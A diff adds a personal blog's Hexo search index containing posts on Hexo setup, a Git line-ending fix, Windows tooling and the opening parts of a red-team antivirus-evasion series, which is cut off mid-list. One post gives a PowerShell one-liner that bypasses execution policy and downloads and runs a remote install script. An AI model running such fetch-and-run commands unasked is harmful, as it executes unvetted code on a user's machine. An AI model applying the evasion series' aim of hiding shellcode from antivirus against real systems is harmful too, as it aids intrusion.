@@ -1,0 +1,276 @@
+<?xml version="1.0" encoding="utf-8"?>
+<search>
+  <entry>
+    <title>Windows下使用GitHubPages托管博客换行问题</title>
+    <url>/2023/11/24/BlogBuild/Bugfix/</url>
+    <content><![CDATA[<h1 id="问题描述"><a href="#问题描述" class="headerlink" title="问题描述"></a>问题描述</h1><p>在美美搭建完博客写了两篇文章之后，发现了一点小小的不对劲，这<code>hexo d</code>推到GithubPages上的博客[图1]和本地[图2]比起来丑了一点点…</p>
+<p><img lazyload="" src="/images/loading.svg" data-src="/images/BlogBuild/Bugfix/bugfix1.png" alt="Bugfix-1"></p>
+<p><img lazyload="" src="/images/loading.svg" data-src="/images/BlogBuild/Bugfix/bugfix2.png" alt="Bugfix-2"></p>
+<p>回忆了起来在<code>hexo d</code>时有提到一些和CRLF有关的warning，想起来了windows的换行符问题，大概率和它有关</p>
+<h1 id="原理及解决"><a href="#原理及解决" class="headerlink" title="原理及解决"></a>原理及解决</h1><p>在windows系统中换行符是由<code>\r\n</code>即回车(<strong>C</strong>arriage<strong>R</strong>eturn)+换行(<strong>L</strong>ine<strong>F</strong>eed)组成的，而在linux和mac上只有一个<code>\n</code>字符就可以达到换行的效果</p>
+<p>这就是为什么有的文件在windows上打开会变成一行，windows的文件放到linux上会多出来一个<code>^M</code></p>
+<p>Git为windows提供了一个特别的设置来解决这个换行的问题，只需要在命令行执行下面命令就行，这样WindowsGit会自动将换行改为<code>LF</code></p>
+<div class="highlight-container" data-rel="Powershell"><figure class="iseeu highlight powershell"><table><tr><td class="code"><pre><span class="line">git config <span class="literal">--global</span> core.autocrlf=false</span><br></pre></td></tr></table></figure></div>
+
+<p>另外有一个注意事项，在配置完毕后需要先删除博客根目录下<code>.deploy_git</code>这个隐藏目录，删除完毕后再执行<code>hexo clean, hexo g, hexo d</code>三步将博客推送过去</p>
+]]></content>
+      <categories>
+        <category>BlogBuild</category>
+      </categories>
+      <tags>
+        <tag>Blog</tag>
+        <tag>Hexo</tag>
+        <tag>bugfix</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>使用Hexo搭建博客</title>
+    <url>/2023/11/12/BlogBuild/Hexo/</url>
+    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>从大二学会搭博客起这已经是第三次迁移博客了，天天重启博客起始也没啥特别的原因，一方面是长时间没写博客了和前面衔接不上让我这强迫症癌感觉不太舒服，另一方面总是想着这次搭起来要把各方各面都做完善，其实现在想想做到完善哪有那么容易，还是好好培养自己写博客的习惯，慢慢把一个博客养好才是正道</p>
+<p>其实以前想过自己写一些效果，但是后来发现这个学习成本还是有点高，时间上不太允许，所以就暂时长久的放入todolist中吧（乐）</p>
+<h1 id="Hexo-Github-Pages-Redefine搭建博客"><a href="#Hexo-Github-Pages-Redefine搭建博客" class="headerlink" title="Hexo+Github Pages+Redefine搭建博客"></a>Hexo+Github Pages+Redefine搭建博客</h1><h2 id="为什么选Hexo"><a href="#为什么选Hexo" class="headerlink" title="为什么选Hexo"></a>为什么选Hexo</h2><p><del>当然是因为之前用的也是hexo啦</del></p>
+<p>开个玩笑，选择搭静态博客主要是因为这些原因：一是写个博客没那么多需要交互的东西，静态搭起来就比较简单省事；二是静态博客比较安全，不容易被日，比较省心；三是操作管理比较简单，直接markdown就能写，GitHub就能托管（懒狗自然是最看重便捷性了）</p>
+<p>至于选择Hexo倒没啥特别的原因，只是最开始s0uthwood师傅搭博客的时候用的hexo，跟着学的就是hexo罢了，其他如Hugo应该也与之类似，具体可以参考<a class="link" href="https://www.elegantcrazy.com/">优雅疯姿态的博客 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
+<h2 id="环境准备"><a href="#环境准备" class="headerlink" title="环境准备"></a>环境准备</h2><h3 id="Git"><a href="#Git" class="headerlink" title="Git"></a>Git</h3><p>Git主要用来进行托管我们的博客，当然自己买个域名开个云服务器然后扔到web目录下也是可以（但是哥们没钱），所以只能就这么用喽</p>
+<p>Linux和Mac下安装git都不算困难，直接<code>apt install git</code>或者<code>brew install git</code>就可以</p>
+<p>Windows下安装git需要到<a class="link" href="https://git-scm.com/download/win">官网 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>去安装，鼠标点点就行（怎么添加到环境变量就不讲了，搜搜就有）</p>
+<p>在命令行输入<code>git</code>有回显就是装好了</p>
+<h3 id="nodejs-npm"><a href="#nodejs-npm" class="headerlink" title="nodejs/npm"></a>nodejs/npm</h3><p>Hexo是基于nodejs开发的，因此系统上必须要有nodejs环境，npm是一个nodejs的包管理工具，个人理解类似于python的pip</p>
+<p>Linux和Mac下同样简单<code>apt install nodejs npm</code>和<code>brew install nodejs npm</code></p>
+<p>Windows下载nodejs还需要去<a class="link" href="https://nodejs.org/en/download">官网 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>，下载自带npm</p>
+<p>在命令行输入<code>node -v</code>和<code>npm -v</code>有回显就是装好了</p>
+<h3 id="Hexo"><a href="#Hexo" class="headerlink" title="Hexo"></a>Hexo</h3><p>有了npm，安装hexo就简单了，打开命令行<code>npm install hexo-cli -g</code>，再安装部署插件<code>npm install hexo-deployer-git --save</code></p>
+<p>在命令行输入<code>hexo</code>有回显就是装好了</p>
+<h2 id="搭建博客"><a href="#搭建博客" class="headerlink" title="搭建博客"></a>搭建博客</h2><h3 id="基础搭建"><a href="#基础搭建" class="headerlink" title="基础搭建"></a>基础搭建</h3><p>首先放一个<a class="link" href="https://hexo.io/zh-cn/docs/">官方文档 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>在这里，真遇到不会的可以去查一手</p>
+<p>接下来详细介绍以下搭建的流程</p>
+<p>第一步初始化一个博客的文件夹</p>
+<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">mkdir hexo # 创建文件夹</span><br><span class="line">cd hexo    # 进入文件夹</span><br><span class="line">hexo init  # 把文件夹初始化为博客根目录</span><br></pre></td></tr></table></figure></div>
+
+<p>嗯其实就没了，到这博客已经创建好了，剩下的就是配置和写博客的事情了，当然还是要预览一下看一眼我们的博客</p>
+<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">hexo server # 或者直接`hexo s`</span><br></pre></td></tr></table></figure></div>
+
+<p>该命令会在本地4000端口开启一个http服务，我们直接在浏览器访问<code>127.0.0.1:4000</code>即可预览我们的博客</p>
+<h3 id="主题选择"><a href="#主题选择" class="headerlink" title="主题选择"></a>主题选择</h3><p>经历了三次博客迁移，我发现大道至简，只要主题长得漂亮，文档写的清晰，同时还在积极更新，基本上就是一个很好的博客主题了，放一个<a class="link" href="https://hexo.io/themes/">hexo的主题页面 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>在这</p>
+<p>这次我的选择是<a class="link" href="https://redefine-docs.ohevan.com/">Redefine <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>这个主题，文档清晰，在GitHub上提issue也很快有回复，推荐</p>
+<p>总体来说主题的配置直接参考<a class="link" href="https://redefine-docs.ohevan.com/getting-started">主题官方文档 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>就行，没啥特别需要说的</p>
+<h3 id="博客撰写"><a href="#博客撰写" class="headerlink" title="博客撰写"></a>博客撰写</h3><p>终于终于可以开始写博客了，虽然说起来这点比主题选择要重要一点，但是从配置流程上来说还是先配置主题再去写博客会好一些（毕竟不同主题对md的编写可能也存在一定区别）</p>
+<p>先简单介绍以下写博客的流程，基本上就是 <code>hexo new</code> <mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.025ex;" xmlns="http://www.w3.org/2000/svg" width="2.262ex" height="1.181ex" role="img" focusable="false" viewBox="0 -511 1000 522"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mo"><path data-c="2192" d="M56 237T56 250T70 270H835Q719 357 692 493Q692 494 692 496T691 499Q691 511 708 511H711Q720 511 723 510T729 506T732 497T735 481T743 456Q765 389 816 336T935 261Q944 258 944 250Q944 244 939 241T915 231T877 212Q836 186 806 152T761 85T740 35T732 4Q730 -6 727 -8T711 -11Q691 -11 691 0Q691 7 696 25Q728 151 835 230H70Q56 237 56 250Z"></path></g></g></g></svg></mjx-container> <code>hexo g</code> <mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.025ex;" xmlns="http://www.w3.org/2000/svg" width="2.262ex" height="1.181ex" role="img" focusable="false" viewBox="0 -511 1000 522"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mo"><path data-c="2192" d="M56 237T56 250T70 270H835Q719 357 692 493Q692 494 692 496T691 499Q691 511 708 511H711Q720 511 723 510T729 506T732 497T735 481T743 456Q765 389 816 336T935 261Q944 258 944 250Q944 244 939 241T915 231T877 212Q836 186 806 152T761 85T740 35T732 4Q730 -6 727 -8T711 -11Q691 -11 691 0Q691 7 696 25Q728 151 835 230H70Q56 237 56 250Z"></path></g></g></g></svg></mjx-container> <code>hexo s</code> <mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.025ex;" xmlns="http://www.w3.org/2000/svg" width="2.262ex" height="1.181ex" role="img" focusable="false" viewBox="0 -511 1000 522"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mo"><path data-c="2192" d="M56 237T56 250T70 270H835Q719 357 692 493Q692 494 692 496T691 499Q691 511 708 511H711Q720 511 723 510T729 506T732 497T735 481T743 456Q765 389 816 336T935 261Q944 258 944 250Q944 244 939 241T915 231T877 212Q836 186 806 152T761 85T740 35T732 4Q730 -6 727 -8T711 -11Q691 -11 691 0Q691 7 696 25Q728 151 835 230H70Q56 237 56 250Z"></path></g></g></g></svg></mjx-container> <code>hexo d</code> 下面挨个介绍几个命令</p>
+<p>第一步是新建一篇文章，在博客根目录（之前mkdir的文件夹）下执行下面命令</p>
+<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">hexo new page --path &lt;Category&gt;/&lt;FileName&gt; "BlogTitle"</span><br></pre></td></tr></table></figure></div>
+
+<p>新建的文章会出现的路径是<code>source/_posts/Category/NewBlog.md</code>，之后就可以去写博客了</p>
+<p>写完博客之后需要将markdown生成静态html页面，在博客根目录执行命令如下</p>
+<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">hexo g</span><br></pre></td></tr></table></figure></div>
+
+<p>执行后会生成出html页面，其位置在<code>public/&lt;year&gt;/&lt;month&gt;/&lt;day&gt;/&lt;category&gt;/&lt;filename&gt;</code>下，当然这个页面只是一个单纯的html，其他的css等配置同样在public目录下</p>
+<p>第三步就是预览我们的博客，在博客根目录执行下面命令，进入<code>127.0.0.1:4000</code>即可看到我们博客的预览图</p>
+<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">hexo s</span><br></pre></td></tr></table></figure></div>
+
+<p>最后，发布我们的博客到github pages（需要先把下面的GithubPages配置完成）</p>
+<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">hexo d</span><br></pre></td></tr></table></figure></div>
+
+<h3 id="发布到Github-Pages"><a href="#发布到Github-Pages" class="headerlink" title="发布到Github Pages"></a>发布到Github Pages</h3><p>在发布之前，需要先对本机和git仓库做一些配置，主要是本机git配置、ssh密钥授权、git博客仓库创建三个部分</p>
+<p>在本机装好git后，需要对本机的git进行简单配置，在命令行输入下面命令即可</p>
+<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">git config --global user.name "你的Github用户名"</span><br><span class="line">git config --global user.email "你的Github邮箱"</span><br></pre></td></tr></table></figure></div>
+
+<p>然后进行ssh密钥授权，首先需要在本机生成ssh密钥</p>
+<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">ssh-keygen -t rsa # 使用rsa加密算法生成密钥，一路回车</span><br><span class="line"></span><br><span class="line">cat ~/.ssh/id_rsa.pub # linux/mac下查看公钥文件</span><br><span class="line">type C:\Users\&lt;Username&gt;\.ssh\id_rsa.pub # Windows下查看公钥文件</span><br></pre></td></tr></table></figure></div>
+
+<p>把 <code>cat/type</code> 的结果放到github上 <code>Settings</code> <mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.025ex;" xmlns="http://www.w3.org/2000/svg" width="2.262ex" height="1.181ex" role="img" focusable="false" viewBox="0 -511 1000 522"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mo"><path data-c="2192" d="M56 237T56 250T70 270H835Q719 357 692 493Q692 494 692 496T691 499Q691 511 708 511H711Q720 511 723 510T729 506T732 497T735 481T743 456Q765 389 816 336T935 261Q944 258 944 250Q944 244 939 241T915 231T877 212Q836 186 806 152T761 85T740 35T732 4Q730 -6 727 -8T711 -11Q691 -11 691 0Q691 7 696 25Q728 151 835 230H70Q56 237 56 250Z"></path></g></g></g></svg></mjx-container> <code>SSH and GPG keys</code> <mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.025ex;" xmlns="http://www.w3.org/2000/svg" width="2.262ex" height="1.181ex" role="img" focusable="false" viewBox="0 -511 1000 522"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mo"><path data-c="2192" d="M56 237T56 250T70 270H835Q719 357 692 493Q692 494 692 496T691 499Q691 511 708 511H711Q720 511 723 510T729 506T732 497T735 481T743 456Q765 389 816 336T935 261Q944 258 944 250Q944 244 939 241T915 231T877 212Q836 186 806 152T761 85T740 35T732 4Q730 -6 727 -8T711 -11Q691 -11 691 0Q691 7 696 25Q728 151 835 230H70Q56 237 56 250Z"></path></g></g></g></svg></mjx-container> <code>New SSH Key</code> 即可，这样就可以直接推送到github页面而不需要输入口令了</p>
+<p>最后需要在git新建一个存放静态博客的仓库，仓库名为 <code>&lt;GithubUsername&gt;.github.io</code>，并在自己博客根目录下找到 <code>_config.yml</code>进行配置，配置如下</p>
+<div class="highlight-container" data-rel="Yaml"><figure class="iseeu highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">deploy:</span></span><br><span class="line">  <span class="attr">type:</span> <span class="string">git</span></span><br><span class="line">  <span class="attr">repo:</span> <span class="string">git@github.com:你的用户名/你的用户名.github.io.git</span></span><br><span class="line">  <span class="attr">branch:</span> <span class="string">master</span></span><br></pre></td></tr></table></figure></div>
+
+<p>至此，可以开始自己快乐的博客撰写之旅了</p>
+<h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>完结撒花，这篇博客总体来说偏向于记录一下流程，很多细节上比较简略，也不太清楚其他朋友们看起来怎么样，如果你有幸读到这篇博客，那么可以在下面评论区留下你宝贵的观后感~</p>
+<p>本来搭完博客的第一件事就是简单记录一下，结果硬是拖了一周才写完这篇博客，希望后续博客可以记得时常更新（笔记存货还不少，反正慢慢复习知识点吧）</p>
+]]></content>
+      <categories>
+        <category>BlogBuild</category>
+      </categories>
+      <tags>
+        <tag>Blog</tag>
+        <tag>Hexo</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Windows下环境搭建记录</title>
+    <url>/2023/11/15/WindowsEnv/WindowsEnvBuild/</url>
+    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>记录一下自己的windows环境搭建和美化的过程，后续可能还会继续添加内容</p>
+<h1 id="Windows下工具"><a href="#Windows下工具" class="headerlink" title="Windows下工具"></a>Windows下工具</h1><p>开发工具：</p>
+<ul>
+<li><a class="link" href="https://code.visualstudio.com/">VSCode <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
+<li><a class="link" href="https://www.jetbrains.com/idea/">IDEA <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
+<li><a class="link" href="https://nodejs.org/en">Nodejs <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
+<li><a class="link" href="https://git-scm.com/">Git <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
+<li><a class="link" href="https://hexo.io/zh-cn/">Hexo <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
+<li>VMWare<ul>
+<li><a class="link" href="https://www.kali.org/">Kali Linux <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
+<li>Windows 10</li>
+</ul>
+</li>
+</ul>
+<p>常用工具：</p>
+<ul>
+<li><a class="link" href="https://www.google.com/chrome/">Chrome <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
+<li><a class="link" href="https://www.microsoft.com/zh-cn/edge?form=MA13FJ">Edge <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
+<li>Clash</li>
+<li><a class="link" href="https://obsidian.md/">Obsidian <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
+<li><a class="link" href="https://www.bandisoft.com/bandizip/">Bandzip <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
+</ul>
+<p>安全工具：</p>
+<ul>
+<li>CobaltStrike</li>
+<li>ida</li>
+<li><a class="link" href="https://www.wireshark.org/">Wireshark <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
+<li>BurpSuite</li>
+</ul>
+<p>VSCode插件:</p>
+<ul>
+<li>C/C++ Themes</li>
+<li>One Dark Pro</li>
+<li>Remote SSH</li>
+<li>background-cover</li>
+<li>GitHub Copilot</li>
+</ul>
+<p>Edge插件:</p>
+<ul>
+<li>划词翻译</li>
+<li>ADGuard</li>
+<li>Proxy SwitchyOmega</li>
+</ul>
+<h1 id="Beautify"><a href="#Beautify" class="headerlink" title="Beautify"></a>Beautify</h1><p>装工具也就图一乐，真开心还得看美化的过程，每次看着自己的电脑漂亮起来都是一种享受</p>
+<h2 id="Oh-My-Posh"><a href="#Oh-My-Posh" class="headerlink" title="Oh-My-Posh"></a>Oh-My-Posh</h2><p>首先贴一个<a class="link" href="https://ohmyposh.dev/">官网 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>在这</p>
+<p>Oh-My-Posh听名字就和Oh-My-Zsh一样，是个用于美化终端的工具，只不过我们今天的主角是用于美化Powershell的</p>
+<p>自从Windows 11以来，Windows Terminal就集成到了windows系统中，比起以前那个黑框框和蓝框框已经好看了不少，但是相较之下还是有点单调，这时就需要我们的Oh-My-Posh来进行美化了</p>
+<p>我个人的Oh-My-Posh美化过程分为三步，安装设置Oh-My-Posh，更换随机主题，更换字体和背景</p>
+<p>首先安装Oh-My-Posh，有两种方法，一种是直接上Microsoft Store上去下载，鼠标点点就行，第二种是powershell命令行下载，命令如下（PS: 更新命令与之相同）</p>
+<div class="highlight-container" data-rel="Powershell"><figure class="iseeu highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Set-ExecutionPolicy</span> Bypass <span class="literal">-Scope</span> <span class="keyword">Process</span> <span class="literal">-Force</span>; <span class="built_in">Invoke-Expression</span> ((<span class="built_in">New-Object</span> System.Net.WebClient).DownloadString(<span class="string">'https://ohmyposh.dev/install.ps1'</span>))</span><br></pre></td></tr></table></figure></div>
+
+<p>第二步需要让我们的terminal打开时自动启动Oh-My-Posh，并设置一个随机的主题。首先查看我们的powershell设置，在powershell中输入<code>$profile</code>回车就能找到设置的路径，在这个ps1文件里添加如下内容完成设置</p>
+<div class="highlight-container" data-rel="Powershell"><figure class="iseeu highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="variable">$theme</span> = <span class="built_in">Get-ChildItem</span> <span class="variable">$env:UserProfile</span>\\AppData\\Local\\Programs\\oh<span class="literal">-my-posh</span>\\themes\\ | <span class="built_in">Get-Random</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">"hello! today's lucky theme is: <span class="variable">$theme</span> :)"</span></span><br><span class="line"><span class="built_in">oh</span><span class="literal">-my-posh</span> <span class="literal">--init</span> <span class="literal">--shell</span> pwsh <span class="literal">--config</span> <span class="variable">$theme</span>.FullName | <span class="built_in">Invoke-Expression</span></span><br></pre></td></tr></table></figure></div>
+
+<p>第三步换字体和背景，<a class="link" href="https://www.nerdfonts.com/">字体下载处 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>，个人推荐JetBrains的<a class="link" href="https://www.programmingfonts.org/#jetbrainsmono">JetBrainsMono Nerd Font <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>，因为很多其他字体会加载不出来图案</p>
+<p>下载完字体后打开windows的<code>设置</code> <code>个性化</code> <code>字体</code>把下载的字体导入，接下来就是让windows terminal识别这个字体（顺便把背景也设置了），首先打开windows terminal的配置文件（开个windows terminal摁下<code>Ctrl+Shift+,</code>），找到如下配置进行对应设置即可</p>
+<div class="highlight-container" data-rel="Json"><figure class="iseeu highlight json"><table><tr><td class="code"><pre><span class="line"><span class="attr">"profiles"</span><span class="punctuation">:</span> </span><br><span class="line">    <span class="punctuation">{</span></span><br><span class="line">        <span class="attr">"defaults"</span><span class="punctuation">:</span> <span class="punctuation">{</span></span><br><span class="line">            <span class="attr">"useAcrylic"</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span><span class="punctuation">,</span> </span><br><span class="line">            <span class="attr">"acrylicOpacity"</span><span class="punctuation">:</span> <span class="number">0.2</span><span class="punctuation">,</span> <span class="comment">// 不透明度</span></span><br><span class="line">            <span class="attr">"backgroundImage"</span><span class="punctuation">:</span> <span class="string">"Path\\image.png"</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">"backgroundImageOpacity"</span><span class="punctuation">:</span> <span class="number">0.4</span><span class="punctuation">,</span> <span class="comment">// 背景图片的不透明度</span></span><br><span class="line">            <span class="attr">"font"</span><span class="punctuation">:</span> </span><br><span class="line">            <span class="punctuation">{</span></span><br><span class="line">                <span class="attr">"face"</span><span class="punctuation">:</span> <span class="string">"JetBrainsMono Nerd Font"</span></span><br><span class="line">            <span class="punctuation">}</span></span><br><span class="line">        <span class="punctuation">}</span><span class="punctuation">,</span></span><br><span class="line">    <span class="punctuation">}</span></span><br></pre></td></tr></table></figure></div>
+
+<p>贴个效果图在这</p>
+<p><img lazyload="" src="/images/loading.svg" data-src="/images/WindowsEnv/WindowsEnvBuild/Terminal.png" alt="Terminal"></p>
+]]></content>
+      <categories>
+        <category>EnvBuild</category>
+      </categories>
+      <tags>
+        <tag>WindowsEnv</tag>
+        <tag>EnvBeautify</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Windows Evasion Part 0</title>
+    <url>/2023/11/26/WindowsEvasion/Part_0/</url>
+    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>这是一组关于我之前学习Windows免杀相关的笔记整理，暂时准备分为基础篇、实践篇，后续可能会根据我个人的学习情况推出番外篇（某只鸽子先立一个flag在这里）</p>
+<h1 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h1><p>众所周知，在红队行动中免杀是十分关键的一环，无论是用作在钓鱼阶段的附件，还是后渗透过程中的横向，保证自己的shellcode能够正常执行不被杀死都是很重要的事情。</p>
+<p>现网络上也已经有了十分多的免杀教程，以及各种绕过检测的奇淫技巧，每每看到这些教程我都会感叹大佬们的思路之巧妙。</p>
+<p>不过很多教程更关注于具体软件的绕过，对于很多基础知识都默认读者已经有所了解，这也是我学习过程中的一大难关。在看了各方的资料之后将一些基础知识整理出来写作一篇博客，一方面供自己以后翻阅查询，另一方面也将学习过程列出供大家交流。</p>
+<p>另外由于本文只是我个人学习的笔记，不免出现很多错误，若文中出现某些问题或可以修改的地方希望大佬们能够帮我指正，在此先提前感谢！</p>
+<h1 id="环境准备"><a href="#环境准备" class="headerlink" title="环境准备"></a>环境准备</h1><p>一台Windows 10虚拟机，配置好VS 2022的环境，由于本笔记更偏向于基础知识，因此可能会在很后面的章节才会出现针对某些软件的免杀，后续若针对特定杀软做免杀的话可以后续再下载</p>
+<p>本笔记准备使用C语言进行编写，总体来说应当是C Windows的编程</p>
+<p>可能会用到一些工具，如<a class="link" href="https://x64dbg.com/">x64debugger <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>和<a class="link" href="https://processhacker.sourceforge.io/">process hacker <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>等</p>
+]]></content>
+      <categories>
+        <category>Redteam</category>
+        <category>Windows Evasion</category>
+      </categories>
+      <tags>
+        <tag>Windows</tag>
+        <tag>Evasion</tag>
+        <tag>Redteam</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Windows Evasion Part 1</title>
+    <url>/2023/12/13/WindowsEvasion/Part_1/</url>
+    <content><![CDATA[<h1 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h1><h2 id="PE文件"><a href="#PE文件" class="headerlink" title="PE文件"></a>PE文件</h2><p>所谓PE文件就是Windows系统上的可执行文件，包括exe类型的文件和dll类型文件两种类型</p>
+<p>如果拿一个二进制查看器打开一个PE文件，可以看到其主要有以下几个部分(图片来自[<a class="link" href="https://github.com/corkami/pics/blob/master/binary/pe101/README.md]">https://github.com/corkami/pics/blob/master/binary/pe101/README.md] <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>)</p>
+<p><img lazyload="" src="/images/loading.svg" data-src="/images/WindowsEvasion/Part_1/pe101zh.png" alt="PE_format"></p>
+<p>总体来说是数据头和数据段两部分：</p>
+<ul>
+<li>数据头<ul>
+<li>DOS头：包含MZ DOS签名，以及PE头的偏移</li>
+<li>PE头：包含PE签名</li>
+<li>PE可选头：可选字段</li>
+<li>数据目录：包含一些附加结构的指针，如导入导出表的指针</li>
+<li>段表：即section table，section也有译为<code>节</code>的，主要记录了后续段中的数据组织情况</li>
+</ul>
+</li>
+<li>段<ul>
+<li>执行代码段：.text段，包含可执行代码部分</li>
+<li>数据段：<ul>
+<li>.rdata：只读代码部分</li>
+<li>.data：全局变量等数据部分</li>
+<li>.bss：存放未初始化/初始化为0的全局变量和静态变量</li>
+</ul>
+</li>
+<li>资源段：.rsrc段，包含不同的对象，主要是各种资源和数据</li>
+<li>导出表：.edata段</li>
+<li>导入表：.idata段</li>
+<li>.pdata：异常信息的部分</li>
+<li>.reloc：包含重定向的部分</li>
+</ul>
+</li>
+</ul>
+<p>图中还介绍了PE文件的加载过程，在这里也简单写点自己的理解，后续的文章也会根据这几个加载部分进行对应的隐藏。PE文件从加载到执行总共分为五个过程：<br>    1. 解析头部<br>    2. 解析段表<br>    3. 将段一映射到内存中<br>    4. 解析导入表<br>    5. 执行进程（执行前进行堆栈初始化）</p>
+<h2 id="EXE和DLL"><a href="#EXE和DLL" class="headerlink" title="EXE和DLL"></a>EXE和DLL</h2><p>之前介绍了，PE文件主要包含EXE和DLL两种类型，他们在执行的时候会被一个名为loader的进程加载到内存中执行，当内存中的函数需要调用某个dll实现的函数时，再去调用dll。loader在加载exe和dll时会分别取调用exe/dll的main函数</p>
+<p>关于exe的编写就不做介绍了，在这里就简单介绍一下dll的生成，一个简单的dll函数如下所示</p>
+<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> comment (lib, <span class="string">"user32.lib"</span>) <span class="comment">//告诉编译器去调用相应的库</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// DLLMain函数，loader调用的入口点</span></span><br><span class="line">BOOL APIENTRY <span class="title function_">DllMain</span><span class="params">(HMODULE hModule,  DWORD  ul_reason_for_call, LPVOID lpReserved)</span> {</span><br><span class="line"></span><br><span class="line">    <span class="comment">// dll在不同情况下的执行情况</span></span><br><span class="line">    <span class="keyword">switch</span> (ul_reason_for_call)  {</span><br><span class="line">    <span class="keyword">case</span> DLL_PROCESS_ATTACH:</span><br><span class="line">    <span class="keyword">case</span> DLL_PROCESS_DETACH:</span><br><span class="line">    <span class="keyword">case</span> DLL_THREAD_ATTACH:</span><br><span class="line">    <span class="keyword">case</span> DLL_THREAD_DETACH:</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">return</span> TRUE;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="comment">// extern声明该函数为导出函数，可被其他进程调用，名称为RunME</span></span><br><span class="line"><span class="keyword">extern</span> <span class="string">"C"</span> {</span><br><span class="line">__declspec(dllexport) BOOL WINAPI <span class="title function_">RunME</span><span class="params">(<span class="type">void</span>)</span> {</span><br><span class="line">	</span><br><span class="line">	MessageBox(</span><br><span class="line">		<span class="literal">NULL</span>,</span><br><span class="line">		<span class="string">"Hello!"</span>,</span><br><span class="line">		<span class="string">"Window"</span>,</span><br><span class="line">        MB_OK</span><br><span class="line">	);</span><br><span class="line">	 </span><br><span class="line">		 <span class="keyword">return</span> TRUE;</span><br><span class="line">	}</span><br><span class="line">}</span><br></pre></td></tr></table></figure></div>
+
+<p>使用vs自带的clang编译exe和dll的命令如下，</p>
+<ul>
